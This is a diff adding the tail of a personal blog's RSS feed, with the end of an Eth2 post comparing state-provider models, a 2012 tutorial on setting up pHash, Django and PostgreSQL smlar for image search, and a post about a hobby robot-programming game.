+&lt;p&gt;Missing state is attributable to the user. In most cases, a BP can include a transaction with insufficient state and have the user pay for it. The only exception is state missing for the initial signature verification or fee payment, in which case the transaction could not be included. Analogous to the Eth1 case, nodes in the network would be expected to drop such transactions from the transaction pool. Some restrictions would have to apply for maximum gas usage for these initial transaction parts.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;key-points&quot;&gt;Key Points&lt;&#x2F;h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Main Benefit: Simplicity. No further specialized SPs or incentive systems necessary. No particular timing constraints.&lt;&#x2F;li&gt;
+&lt;li&gt;Main Drawback: Only works with transactions that know in advance all state they could potentially access. This limits functionality of the overall system. While some mitigations seem possible, composability would remain severely limited. In particular, Eth1 could not become an Eth2 EE under this model.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;relayed-push-model&quot;&gt;Relayed Push Model&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;relayed-push.png&quot; alt=&quot;Two users submitting transactions through relayers&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Users send transactions to one of several &lt;strong&gt;Relayers&lt;&#x2F;strong&gt; (specialized SPs). The relayer bundles the transactions, attaches state and relays the bundle to the network. Nodes maintain a pool of pending bundles. As blocks are produced, relayers relay updates to their bundles, while all nodes refresh the corresponding witnesses. When creating a block, a BP chooses one pending up-to-date bundle from the pool to include into the new block.&lt;&#x2F;p&gt;
+&lt;p&gt;Alternatively, if a pool of bundles proves infeasible, the system could function without it. Relayers only advertise the existence of bundles. A BP then reaches out to a relayer directly to acquire the bundle and include it into a new block.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;state-access-restrictions-2&quot;&gt;State Access Restrictions&lt;&#x2F;h4&gt;
+&lt;p&gt;No restrictions. Having relayers publish updates to their bundles every slot ensures that the state provided for these bundles is sufficient. Furthermore, any new block only includes one bundle, preventing interference between bundles.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;incentives-2&quot;&gt;Incentives&lt;&#x2F;h4&gt;
+&lt;p&gt;Incentivizing relayers is complicated because, once state and witnesses have been revealed, users and&#x2F;or BPs have the opportunity to recreate the bundle without the payment to the relayer.&lt;&#x2F;p&gt;
+&lt;p&gt;Two possible solutions:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;In the case without a pool, transaction bundles are not public. Relayers sell the bundles with state attached to BPs (for a price lower than the transaction fees), forming a bundle market. There are several risks to BPs: a transaction might have been previously included in another block, otherwise become invalid, or pay lower transaction fees than advertised.&lt;&#x2F;li&gt;
+&lt;li&gt;Alternatively—with or without a pool—transactions can include a payment to a specific relayer. The user promises an exclusivity period (i.e. a couple of slots), during which the user may not create any other transactions. The EE would have to provide a method to &amp;quot;slash&amp;quot; users signing two or more transactions with overlapping exclusivity periods. As users don&#x27;t have a stake locked up, it is unclear how to deal with slashings for users without a sufficient account balance.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;centralization-risks-2&quot;&gt;Centralization Risks&lt;&#x2F;h4&gt;
+&lt;p&gt;Depending on how the relayer incentives are structured:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Assuming merging bundles is complex (because of DSA), a bundle market leads to high centralization and allows a single relayer to censor transactions. Because of the risks to BPs outlined above, BPs will likely prefer to deal with well-known and trusted relayers. Individual users will not be able to offer bundles with high enough fees to compete with these well-known relayers.&lt;&#x2F;li&gt;
+&lt;li&gt;Using an exclusivity period and a bundle pool leads to a higher degree of decentralization, at the cost of user convenience and a more complex pool implementation. Any user could in theory retrieve a bundle from the pool, extend it with their transaction, and relay it with a higher fee payment.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;timing-constraints-2&quot;&gt;Timing Constraints&lt;&#x2F;h4&gt;
+&lt;p&gt;To support arbitrary transactions, any bundle included into a block has to be up-to-date. Relayers have to download the previous block, create and send an update for their bundle, have that update reach the BP, and have the BP include the updated bundle into a new block, all within one slot&#x27;s time.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;attributability-of-missing-state-2&quot;&gt;Attributability of Missing State&lt;&#x2F;h4&gt;
+&lt;p&gt;Missing state is attributable to the relayer. Relayers could be required (or could voluntarily choose) to send a &amp;quot;refund transaction&amp;quot; along with any relayed transaction. The refund transaction would be used to refund the BP if the original transaction were to fail due to missing state.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;key-points-1&quot;&gt;Key Points&lt;&#x2F;h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Main Benefit: No state access restrictions.&lt;&#x2F;li&gt;
+&lt;li&gt;Drawbacks:
+&lt;ul&gt;
+&lt;li&gt;The version with a pool of transaction bundles might be infeasible do to the large size of bundles (as opposed to the Eth1 pool of individual transactions) and the strict timing constraints.&lt;&#x2F;li&gt;
+&lt;li&gt;Without a pool, bundles cannot be combined, resulting in only one relayer contributing to any given block. Relayers would be expected to centralize, which introduces censorship concerns.&lt;&#x2F;li&gt;
+&lt;li&gt;Even in the pool case, it is unclear whether the combining of bundles would work well enough to fully alleviate censorship concerns.&lt;&#x2F;li&gt;
+&lt;li&gt;Complex incentive system.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;pull-model&quot;&gt;Pull Model&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;pull.png&quot; alt=&quot;BPs pulling state from an SP&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Users send transactions to the network, where nodes maintain a pool of pending transactions. Before creating a block, a BP chooses a subset of the pending transactions from the pool and sends them to a SP requesting the state for this transaction bundle. Having received that state, the BP can include the bundle into the new block.&lt;&#x2F;p&gt;
+&lt;p&gt;In order for intermediary nodes and the BP to verify the validity of a transaction before the full state is attached by the SP, the user would have to attach enough state to the transaction to verify the signature and fee payment ability. This transaction part would therefore have to be standardized across EEs, with the simplest option being a verification function provided by all EEs.&lt;&#x2F;p&gt;
+&lt;p&gt;Alternatively, a &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;de-risking-execution-environments-by-adding-value-holding-ees&#x2F;6413&quot;&gt;Value-Holding EE (VHEE)&lt;&#x2F;a&gt; could be enshrined. Any transaction would use this VHEE for fee payments. Nodes in the network would understand the VHEE and could thus verify transaction validity.&lt;&#x2F;p&gt;
+&lt;p&gt;In both cases, nodes in the network would be expected to update the witnesses for this attached state as new blocks arrive.&lt;&#x2F;p&gt;
+&lt;p&gt;BPs have no way to predict the actual gas used by any bundle of combined transactions. In particular, any transaction in that bundle could invalidate all further transactions in the same bundle, for example by reducing the balances of their senders to 0. To mitigate that, BPs could &amp;quot;overbundle&amp;quot;, i.e. send more transactions to the SP than they expect to fit into a block. The SP would provide state for those transactions until the block limit is reached. In the VHEE case, transactions could additionally be required to include a list of VHEE addresses and the maximum amount they might reduce the balance of that address by. In this way, a BP could pick transactions in such a way as to prevent earlier transactions invalidating later ones.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;state-access-restrictions-3&quot;&gt;State Access Restrictions&lt;&#x2F;h4&gt;
+&lt;p&gt;No restrictions for the main transaction. The BP only reaches out to the SP when creating the block, ensuring the state returned is up to date. Even more importantly, by bundling the transactions and requesting state for the whole bundle at once, state is attached in the exact context these transactions are then included into the block. This ensures that the provided state is always sufficient. It constitutes one of the key differences to the Direct Push Model, where state is attached &lt;em&gt;before&lt;&#x2F;em&gt; the transactions are bundled, resulting in the restrictions of that model.&lt;&#x2F;p&gt;
+&lt;p&gt;As the user would have to include state for signature verification and fee payment, this transaction part would technically have the same restrictions outlined in the Direct Push Model. However, those limitations would be insignificant in practice. As signature verification and fee payment also have predictable state access under Eth1, compatibility between Eth1 and Eth2 would not be impaired. Moreover, in case of a VHEE, the VHEE would be designed in such a way as to ensure predictable state access, making further restrictions unnecessary.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;incentives-3&quot;&gt;Incentives&lt;&#x2F;h4&gt;
+&lt;p&gt;The BP pays the SP for the provided state, e.g. via a payment channel. Depending on the trust between the BP and the SP, this could be done on a (trust-minimized) per-transaction basis or a (more efficient) per-bundle basis.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;centralization-risks-3&quot;&gt;Centralization Risks&lt;&#x2F;h4&gt;
+&lt;p&gt;SPs must hold the entire state, which will require a substantial amount of storage. SPs will also be expected to execute transaction bundles quickly, so computing power is also required.&lt;&#x2F;p&gt;
+&lt;p&gt;BPs will likely prefer to acquire state from SPs they&#x27;ve built trust with, to reduce the risk of griefing, increasing centralization.&lt;&#x2F;p&gt;
+&lt;p&gt;However, no individual SP can censor a transaction, since the BP creates and orders the transaction bundle. An SP may withhold state for an entire bundle, but doing so would risk their reputation and the BP could easily retry with another SP.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;timing-constraints-3&quot;&gt;Timing Constraints&lt;&#x2F;h4&gt;
+&lt;p&gt;A BP would have to reach out to an SP to acquire updated state for the pending bundle within one slot&#x27;s time.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;attributability-of-missing-state-3&quot;&gt;Attributability of Missing State&lt;&#x2F;h4&gt;
+&lt;p&gt;SPs are always responsible for providing the state requested. BPs only pay after verifying this state is sufficient and are not allowed to include transactions with insufficient state into a block.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;key-points-2&quot;&gt;Key Points&lt;&#x2F;h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Benefits:
+&lt;ul&gt;
+&lt;li&gt;No relevant state access restrictions.&lt;&#x2F;li&gt;
+&lt;li&gt;Less problematic timing constraints.&lt;&#x2F;li&gt;
+&lt;li&gt;No significant centralization risks. While it can be expected that a small subset of SPs will specialize in providing state for BPs, no SP can significantly interfere with the overall process. The worst a SP can do is not provide state when asked to do so.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Main Drawback: Some standardization around signature verification necessary, either via verification scripts or via an enshrined VHEE.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;further-discussion&quot;&gt;Further Discussion&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;preemptive-witnesses-gas-costs&quot;&gt;Preemptive Witnesses &amp;amp; Gas Costs&lt;&#x2F;h3&gt;
+&lt;p&gt;If the transaction initiator is able to provide enough witnesses beyond ensuring their balance, should the state access be cheaper? This should be deterministic if the witnesses are signed with the transaction, but would add complexity.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;cost-of-state&quot;&gt;Cost of State&lt;&#x2F;h3&gt;
+&lt;p&gt;How do block proposers and state providers negotiate the price for state? Is it set by the network? Should block proposers tender bids from multiple state providers for a block, and select the cheapest one?&lt;&#x2F;p&gt;
+&lt;p&gt;Should the price be set per state access? Per byte of witness data?&lt;&#x2F;p&gt;
+&lt;p&gt;If you charge per byte of witness data, how does the BP know the SP isn&#x27;t including unnecessary bytes?&lt;&#x2F;p&gt;
+&lt;p&gt;If multiple transactions use the same witnesses, should the price be evenly divided? Full price for each transaction? Only the first transaction pays?&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;state-abstraction&quot;&gt;State Abstraction&lt;&#x2F;h3&gt;
+&lt;p&gt;The exact semantics of how execution environments request state is not defined by this proposal, but would be required for the pull or relay models to work.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;decentralized-state-network&quot;&gt;Decentralized State Network&lt;&#x2F;h3&gt;
+&lt;p&gt;Instead of collecting transactions and sending the entire bundle to a state provider, would it be possible to create a distributed hash table, and have the block proposer request state on-the-fly during execution? This alternative would block execution of transactions on network requests, and likely make serial execution of transactions too slow&#x2F;unpredictable. Leveraging advancements in &lt;a href=&quot;https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;1809.01326&quot;&gt;software transactional memory&lt;&#x2F;a&gt; could still make this viable.&lt;&#x2F;p&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>DIY Image Search: Part 1 - Introduction</title>
+                <pubDate>Sun, 24 Jun 2012 01:16:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/images-01/</link>
+                <guid>https://binarycake.ca/posts/images-01/</guid>
+                <description>&lt;p&gt;I&#x27;m sure everyone has had an awesome picture lying around on their hard drive for what seems like forever, with a gibberish file name and no clues as to the source.  Most people would simply navigate to a site like &lt;a href=&quot;https:&#x2F;&#x2F;www.tineye.com&#x2F;&quot;&gt;TinEye&lt;&#x2F;a&gt; and use their awesome service to identify the image and find a source.  Not you, you&#x27;re interested in building some kind of software hacked together with ducktape and string, or else why would you be reading this?&lt;&#x2F;p&gt;
+&lt;p&gt;I&#x27;m going to be flying by the seat of my pants for this series, and I&#x27;m giving very little forethought to future posts.  Things probably will be changing dramatically as I progress through this project, so I&#x27;m going to apologise in advance if everything isn&#x27;t as contiguous as it should be.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;the-tools&quot;&gt;The Tools&lt;&#x2F;h2&gt;
+&lt;p&gt;To build this monstrosity, I&#x27;m going to use a couple of interesting projects: &lt;a href=&quot;http:&#x2F;&#x2F;phash.org&#x2F;&quot;&gt;pHash&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;polachok&#x2F;py-phash&quot;&gt;py-pHash&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;www.djangoproject.com&#x2F;&quot;&gt;django&lt;&#x2F;a&gt; and &lt;a href=&quot;http:&#x2F;&#x2F;www.niwi.be&#x2F;post&#x2F;project-django-orm&#x2F;&quot;&gt;django-orm&lt;&#x2F;a&gt;, and &lt;a href=&quot;http:&#x2F;&#x2F;www.postgresql.org&#x2F;&quot;&gt;PostgreSQL&lt;&#x2F;a&gt; with the &lt;a href=&quot;http:&#x2F;&#x2F;sigaev.ru&#x2F;git&#x2F;gitweb.cgi?p=smlar.git;a=summary&quot;&gt;smlar&lt;&#x2F;a&gt; extension.  I won&#x27;t be going over django or PostgreSQL, so if they are foreign to you, take some time to learn about them.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;what-is-phash&quot;&gt;What is pHash?&lt;&#x2F;h3&gt;
+&lt;p&gt;To understand pHash, you&#x27;ll need a basic understanding of hashes.  If you have no idea what they are, go and check out the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Hash_function&quot;&gt;hash function&lt;&#x2F;a&gt; page on wikipedia.  The Coles Notes version is that a hash function transforms an arbitrarily-sized input into a smaller fixed-size output.&lt;&#x2F;p&gt;
+&lt;p&gt;There is a staggering variety of hashes, and an even more astounding number of applications for them.  The type of hash we&#x27;re using, a perceptual hash, maps visually (or acoustically) similar input to similar output hashes.  Take a look at the following example:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;comparison.png&quot; alt=&quot;Demonstration of Perceptual Hashes&quot; &#x2F;&gt;
+&lt;em&gt;Tree Picture by &lt;a href=&quot;https:&#x2F;&#x2F;commons.wikimedia.org&#x2F;wiki&#x2F;User:Calibas&quot;&gt;Calibas&lt;&#x2F;a&gt; &#x2F; Cervus Elaphus Picture by &lt;a href=&quot;http:&#x2F;&#x2F;www.lucnix.be&#x2F;&quot;&gt;Luc Viatour&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;On the left we have our images, and on the right, the pHash for the image.  Each red digit indicates a nibble that differs from the pHash of the original colour picture.  Notice how the colour and greyscale images have very similar hashes, while the third picture has a dramatically different hash.&lt;&#x2F;p&gt;
+&lt;p&gt;By now, you can probably see how a perceptual hash would be useful: to find images similar to A, we compute the hash for A and search for all images within a threshold distance.&lt;&#x2F;p&gt;
+&lt;p&gt;py-pHash is a Python wrapper for the pHash library, which will make integrating it with django much easier later on.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;what-is-django-orm&quot;&gt;What is django-orm?&lt;&#x2F;h3&gt;
+&lt;p&gt;Django-orm is a collection of 3rd-party extensions to django&#x27;s already pretty awesome database system.  It adds support for a metric tonne of new database features, like negated F expressions and full text search, but the most interesting feature it adds to django is the PostgreSQL specific ArrayField.&lt;&#x2F;p&gt;
+&lt;p&gt;The smlar extension uses arrays extensively, so having support for them in django is essential.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;what-is-smlar&quot;&gt;What is smlar?&lt;&#x2F;h3&gt;
+&lt;p&gt;Smlar is an extension for PostgreSQL built by Oleg Bartunov and Teodor Sigaev.  It allows you to make effective similarity searches in PostgreSQL databases on pretty much any kind of data, as long as you can put it in an array.  Alexey Vasiliev goes into a lot more depth on similarity searches on his &lt;a href=&quot;http:&#x2F;&#x2F;railsware.com&#x2F;blog&#x2F;2012&#x2F;05&#x2F;10&#x2F;effective-similarity-search-in-postgresql&#x2F;&quot;&gt;blog&lt;&#x2F;a&gt;, including some example code, but basically the relevant information is that smlar adds efficient similarity searches and indexes.&lt;&#x2F;p&gt;
+&lt;p&gt;We&#x27;ll be using smlar to find similar hashes, which will let us find similar images very quickly.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;the-setup&quot;&gt;The Setup&lt;&#x2F;h2&gt;
+&lt;p&gt;I&#x27;m running Ubuntu 12.04, so my instructions are going to be very biased towards (read: only for) Linux.  Convert the instructions to use the package management system of your choice! I&#x27;m using the standard Python that ships with Ubuntu, which at the time of writing is 2.7.3.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;postgresql-smlar&quot;&gt;PostgreSQL &amp;amp; smlar&lt;&#x2F;h3&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#65737e;&quot;&gt;# Leave a comment if I missed something,
+# which is more than probable...
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; apt-get install postgresql-9.1 \
+                     postgresql-server-dev-9.1 \
+                     git build-essential
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Clone smlar and build&#x2F;install it
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;git clone git:&#x2F;&#x2F;sigaev.ru&#x2F;smlar
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; smlar
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;make &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; make install
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Enable the extension
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -u&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; postgres psql&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;CREATE EXTENSION smlar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Setup django user and database
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -u&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; postgres psql&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;CREATE DATABASE lostpic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sudo -u&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; postgres psql&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;CREATE USER lostpic WITH PASSWORD &amp;#39;password1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sudo -u&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; postgres psql&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;GRANT ALL PRIVILEGES ON DATABASE lostpic TO lostpic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;phash&quot;&gt;pHash&lt;&#x2F;h3&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;sudo apt-get install libphash0 libphash0-dev
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;virtualenv&quot;&gt;Virtualenv&lt;&#x2F;h3&gt;
+&lt;p&gt;I&#x27;ll be using virtualenv to manage a separate Python environment to make deployment easier.  This step is optional, but recommended.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#65737e;&quot;&gt;# Install virtualenv
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; apt-get install python-virtualenv
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; &#x2F;path&#x2F;to&#x2F;project
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Make the virtual environment
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;virtualenv pyenv
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Activate it (its &amp;#39;deactivate&amp;#39; to exit)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;. .&#x2F;pyenv&#x2F;bin&#x2F;activate
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;django-dependencies&quot;&gt;Django &amp;amp; Dependencies&lt;&#x2F;h3&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;pip&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; install psycopg2 django django-orm
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pip&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; install git+https:&#x2F;&#x2F;github.com&#x2F;polachok&#x2F;py-phash.git
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;django-admin.py&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; startproject lostpic
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; lostpic&#x2F;lostpic
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Edit &lt;code&gt;settings.py&lt;&#x2F;code&gt; with your favourite editor and make the following changes:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Set the database backend to &lt;code&gt;postgresql_psycopg2&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;The database user is &lt;code&gt;lostpic&lt;&#x2F;code&gt;, the password is &lt;code&gt;password1&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Uncomment the admin application in &lt;code&gt;INSTALLED_APPS&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Don&#x27;t forget to edit &lt;code&gt;urls.py&lt;&#x2F;code&gt; to enable the admin.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;next-up&quot;&gt;Next Up&lt;&#x2F;h2&gt;
+&lt;p&gt;In the next instalment, we&#x27;ll be building the models to store picture information and writing the functions to look up pictures by similarity.&lt;&#x2F;p&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>Robots!</title>
+                <pubDate>Sun, 10 Jun 2012 11:44:00 -0700</pubDate>
+                <link>https://binarycake.ca/posts/robots/</link>
+                <guid>https://binarycake.ca/posts/robots/</guid>
+                <description>&lt;p&gt;If you&#x27;ve been around me in the past couple of days, you&#x27;ve probably heard me talking endlessly about robots, and possibly PyPy, and my trials and tribulations with RPython.  I&#x27;ve been working pretty hard on building something fun that isn&#x27;t a website, and I think I&#x27;ve succeeded, at least at entertaining myself.&lt;&#x2F;p&gt;
+&lt;p&gt;A little bit of back story would probably be useful here.  I first got interested in programming when I read about Java, back in the early 2000s.  I saw a magazine in a news stand proclaiming the awesomeness of Sun&#x27;s baby, and had to buy it.  Thankfully as a ten year old, my money was practically non-existent and I was unable to acquire it.  I forgot about programming for months, until Christmas rolled around and my parents bought me Borland&#x27;s C++ with a Sam&#x27;s Teach Yourself C++ in 21 days.&lt;&#x2F;p&gt;
+&lt;p&gt;After miserably failing to wrap my brain around pointers, I began looking at other ways to program, and I eventually discovered AT Robots, Corewars, and other awesome games.  These games, especially Robocom, are what inspired tonight&#x27;s project.&lt;&#x2F;p&gt;
+&lt;p&gt;I give you Robots!  This is my way of saying thank you to those who got me interested in programming (I hope no one ever finds this post, since its a fairly terrible thank you, but I digress.)&lt;&#x2F;p&gt;
+&lt;p&gt;In Robots! you program a single robot whose goal is to eliminate the other Robot teams on the field.  Robots can move, scan, replicate and transfer instructions between each other.  The user interface is limited to a grid with coloured circles, or an even worse command line interface, but I think it gets the point across:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;gui.png&quot; alt=&quot;Robots, a wxPython Application&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The game is played on a 100 by 100 grid where the edges wrap around, torus style.&lt;&#x2F;p&gt;
+&lt;p&gt;Robots are programmed in a very simple assembly like language that is interpreted by an RPython program.  The game state is transferred to the user interface, which is written in full Python with wxPython and Cairo.&lt;&#x2F;p&gt;
+&lt;p&gt;A sample Robot program:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;:start
+build $left
+
+:program
+set L1 :end
+sub L1 1
+
+:program-loop
+if $lt L1 :new
+jump (:start)       &amp;#39; Exit the loop when the counter reaches :new
+
+set L0 L1           &amp;#39; Copy source location to L0
+sub L0 :new         &amp;#39; Make relative to :start
+
+xfer $left L1 L0    &amp;#39; Transfer the new instruction from L1 to L0
+sub L1 1
+jump (:program-loop)
+
+:new
+go $up
+jump (:new)
+:end
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This simple program builds copies of itself and sends them on their merry way around the board.&lt;&#x2F;p&gt;
+&lt;p&gt;Feel free to take a look at the code over on GitHub and play around:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tecywiz121&#x2F;robots&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;tecywiz121&#x2F;robots&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+</description>
+            </item>
+        
+    </channel>
+</rss>
